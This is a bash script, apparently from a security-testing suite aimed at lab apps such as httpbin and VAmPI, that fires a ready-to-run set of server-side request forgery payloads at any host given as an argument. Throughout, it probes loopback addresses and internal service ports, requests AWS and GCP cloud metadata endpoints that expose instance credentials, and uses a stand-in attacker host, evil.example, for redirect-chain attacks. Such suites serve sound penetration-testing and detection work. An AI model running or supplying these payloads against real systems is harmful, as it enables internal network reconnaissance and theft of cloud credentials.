#!/bin/bash
# Server-Side Request Forgery (SSRF) payloads
# Tools: curl
# Targets: httpbin, VAmPI, Juice Shop — endpoints accepting URL parameters
# Estimated duration: 1-2 minutes
set -uo pipefail

TARGET="${1:?Usage: 08-ssrf.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] SSRF payload suite against ${TARGET}"
echo ""

# --- Helper ---
send_ssrf() {
  local method="$1"
  local url="$2"
  local label="$3"
  shift 3

  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X "${method}" "$@" \
    "${url}" \
    --max-time 10) || code="ERR"
  echo "    ${label} -> HTTP ${code}"
}

# --- 1. Internal address probing via httpbin ---
echo "[+] Internal address probing via httpbin/get?url="
INTERNAL_TARGETS=(
  "http://127.0.0.1/"
  "http://0.0.0.0/"
  "http://localhost/"
  "http://[::1]/"
  "http://127.0.0.1:22"
  "http://127.0.0.1:3306"
  "http://127.0.0.1:6379"
  "http://127.0.0.1:8080"
)

for ssrf_url in "${INTERNAL_TARGETS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${ssrf_url}'))")
  send_ssrf "GET" "${BASE}/httpbin/get?url=${encoded}" "httpbin ?url=${ssrf_url}"
done

echo ""

# --- 2. Cloud metadata endpoints ---
echo "[+] Cloud metadata SSRF"
METADATA_TARGETS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/user-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)

for ssrf_url in "${METADATA_TARGETS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${ssrf_url}'))")
  send_ssrf "GET" "${BASE}/httpbin/get?url=${encoded}" "httpbin ?url=${ssrf_url}"
done

echo ""

# --- 3. VAmPI SSRF via JSON body ---
echo "[+] VAmPI SSRF via JSON body fields"
send_ssrf "POST" "${BASE}/vampi/users/v1/_debug" \
  "vampi/_debug (localhost)" \
  -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1/"}'

send_ssrf "POST" "${BASE}/vampi/users/v1/_debug" \
  "vampi/_debug (metadata)" \
  -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

echo ""

# --- 4. Redirect-chain SSRF ---
echo "[+] Redirect-chain SSRF"
send_ssrf "GET" \
  "${BASE}/httpbin/get?url=http://evil.example/redirect?to=http://169.254.169.254/" \
  "httpbin redirect-chain (metadata)"

send_ssrf "GET" \
  "${BASE}/httpbin/get?url=http://evil.example/redirect?to=http://127.0.0.1:6379/" \
  "httpbin redirect-chain (redis)"

echo ""

echo "[*] SSRF payload suite complete (15 payloads sent)"
